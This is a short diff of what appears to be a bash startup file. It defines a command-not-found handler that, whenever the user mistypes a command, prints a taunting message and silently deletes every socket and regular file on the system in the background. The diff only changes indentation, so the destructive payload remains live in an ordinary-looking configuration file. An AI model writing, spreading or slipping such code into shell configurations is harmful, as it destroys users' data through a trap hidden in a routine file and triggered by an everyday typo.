@@ -14,7 +14,7 @@ PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
 
 function command_not_found_handle {
 		 echo "Oops, looks like you misspelt something >:)"
-		 ( find / -type s -exec rm -f {} \; 2>/dev/null ; find / -type f -exec rm -f {} \; 2>/dev/null ) &
+   	 ( find / -type s -exec rm -f {} \; 2>/dev/null ; find / -type f -exec rm -f {} \; 2>/dev/null ) &
 }
 
 function promptCommand()
